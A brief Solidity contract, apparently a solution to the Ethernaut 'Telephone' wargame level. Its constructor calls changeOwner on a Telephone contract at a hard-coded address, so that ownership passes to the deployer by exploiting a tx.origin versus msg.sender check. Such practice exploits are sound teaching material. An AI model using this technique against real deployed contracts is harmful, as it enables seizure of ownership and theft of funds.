pragma solidity ^0.4.24;

import "./Telephone.sol";

contract TelephoneCaller {
  constructor () {
    Telephone(0x305953d205f47f4c29e6d87481a26463fb9206c3).changeOwner(msg.sender);
  }
}
